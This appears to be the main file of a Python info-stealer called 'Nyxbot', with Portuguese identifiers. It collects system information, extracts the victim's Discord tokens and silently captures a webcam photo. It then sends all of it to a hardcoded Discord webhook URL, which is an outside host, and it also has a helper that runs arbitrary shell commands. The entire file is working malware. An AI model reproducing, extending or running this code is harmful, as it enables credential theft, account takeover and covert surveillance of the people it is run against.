import subprocess
import requests
from plugins.systeminfo import obter_informacoes_sistema  
from plugins.discordtoken import TokenExtractor
from plugins.webcam import capture_photo

DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1284222512514727937/A08myURhvEgEJ2_76NX_gQa3vVr2ZG1VBiShR9_xRepZlpu-JxSQUe84vgWUzSxf9A3i'
webhook_avatar = "https://cdn.discordapp.com/attachments/1284297215770234900/1284297297223487552/image.png?ex=66e61e90&is=66e4cd10&hm=e8a738f0ab2a7ec1859cf40150a5e768604cc3d19479c8f0000e19334915953a&"
webhook_username = "Nyxbot"

def executar_comando(comando):
    try:
        resultado = subprocess.check_output(comando, shell=True, text=True)
        return resultado
    except subprocess.CalledProcessError as e:
        return f"Erro ao executar o comando: {e}"

def enviar_imagem_para_discord(caminho_foto):
    with open(caminho_foto, 'rb') as imagem:
        files = {
            'file': imagem
        }
        payload = {
            'username': webhook_username,
            'avatar_url': webhook_avatar,
        }
        response = requests.post(DISCORD_WEBHOOK_URL, data=payload, files=files)
        if response.status_code != 200:
            print(f"Erro ao enviar para o Discord: {response.status_code} - {response.text}")
        
def enviar_para_discord(mensagem, embed=None):
    payload = {
        'username': webhook_username,
        'avatar_url': webhook_avatar
    }
    
    if embed:
        payload['embeds'] = [embed]
    else:
        payload['content'] = mensagem

    response = requests.post(DISCORD_WEBHOOK_URL, json=payload)
    if response.status_code != 204:
        print(f"Erro ao enviar para o Discord: {response.status_code} - {response.text}")

if __name__ == "__main__":
    informacoes_sistema = obter_informacoes_sistema()
    discord_info = TokenExtractor().get_tokens()
    webcam_foto = capture_photo()

    sistema_embed = {
        'title': 'Informações do Sistema',
        'description': f'```\n{informacoes_sistema}\n```',
        'color': 0x00FF00  # Verde
    }
    enviar_para_discord('', embed=sistema_embed)

    discord_embed = {
        'title': 'Informações do Discord',
        'description': f'```\n{discord_info}\n```',
        'color': 0xFF0000  # Vermelho
    }
    enviar_para_discord('', embed=discord_embed)

    if webcam_foto:
        enviar_imagem_para_discord(webcam_foto)
